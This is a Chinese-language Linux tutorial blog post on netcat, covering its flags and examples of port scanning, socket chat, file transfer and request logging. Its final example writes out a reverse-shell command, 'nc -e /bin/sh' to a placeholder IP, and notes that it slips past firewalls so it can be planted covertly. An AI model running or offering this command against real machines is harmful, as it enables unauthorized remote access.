---
layout: post
title: Your daily dose of linux(31)
category: linux
tag : linux
---
<img src="/img/in-post/linux.jpg">

### nc  

nc, 也就是netcat, 可以用来快速建立读写tcp, udp链接的工具, 既可以监听, 也可以做server来连接端口(比如类似telnet的作用)  

命令参数:  
>-d, 后台模式运行  
>-e, 重定向  
>-h, 查看帮助信息  
>-i [secs], 延时设置, 秒为单位  
>-l, 监听端口信息  
>-p, 打开本地端口  
>-u, udp模式  
>-v, 详细信息模式 vv会更加详细  
>-w, 建立时间连接  
>-z, I/O模式, 扫描信息  

命令用例:  
1.扫描端口 ip port范围    
*nc -nv 127.0.0.1 1-1000*  

2.连接到目标  
*nc -l 127.0.0.1 9999* 服务器端  
*nc 127.0.0.1 9999* 客户端  
`这样就建立了一个最简单的socket模型 可以互相传输文本信息`  

3.传输文件, 类似的, 通过重定向stdio, stdout也可以用来传输文件  
*nc -l 127.0.0.1 9999 < test.txt* 服务器端  
*nc 127.0.0.1 9999 < test1.txt* 客户端  

4.扫描时添加时间限制, 到时后断开  
*nc -nv 127.0.0.1 80 -w 3*  
`扫描3s后断开`  

5.强制nc服务器保持启动状态  
*nc -k -l 127.0.0.1 9999*  
`客户端退出后, 服务器端并不终止`  

6.作为蜜罐, 作为server时监听某端口, 就可以看到此端口接受的请求, 更可以重定向这些到某个log, 以便分析  
*nc -l 127.0.0.1 80 > test.log*  

7.反弹shell  
本地执行 *nc -l –vv -p 2012* 远程执行 *nc -e /bin/sh {your ip} 2012* 这样shell就被反弹的本地机器, 因为主机主动发送的情况本地防火墙等设备一般不会拦截, 所以后台可以这样来植入  







